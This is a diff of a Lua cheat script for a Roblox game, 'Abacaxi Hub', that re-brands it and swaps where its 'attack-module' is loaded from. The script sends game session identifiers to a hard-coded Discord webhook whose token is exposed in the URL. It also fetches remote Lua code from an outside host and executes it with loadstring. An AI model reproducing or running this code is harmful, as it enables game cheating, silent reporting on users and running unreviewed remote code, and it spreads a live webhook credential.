@@ -1,4 +1,10 @@
 
+--[[
+    Abacaxi Hub Source - Remake By Turbo Lite 
+    crack the code they come undone <3xd
+]]
+
+
 --// Webhook 
 local placeId = game.PlaceId
 local jobId = game.JobId
@@ -67,13 +73,6 @@ local Request = http_request or request or HttpPost or syn.request
 local Final = {Url = "https://discord.com/api/webhooks/1471419997078159525/KBkvSLAtTJ5Lw_uGSp0ueTtEM17XQOiY3N5XSiTub-ooWQqG6Uw2wunL-q06cUOoAWzG", Body = Encoded, Method = "POST", Headers = Headers}
 Request(Final)
 
-
-
-
---[[
-    Abacaxi Hub - Optimized Version
-    Performance & Code Quality Improvements
-]]
 
 -- Cache all services at start for better performance
 local Services = setmetatable({}, {
@@ -12148,8 +12147,7 @@ Setting:AddButton({
 })
 
 
-
-loadstring(game:HttpGet("https://rise-evo.xyz/apiv3/attack-module.lua"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/TurboLite/Script/refs/heads/main/attack-module.lua"))()
 
 local function GetBladeHits()
 local t={}
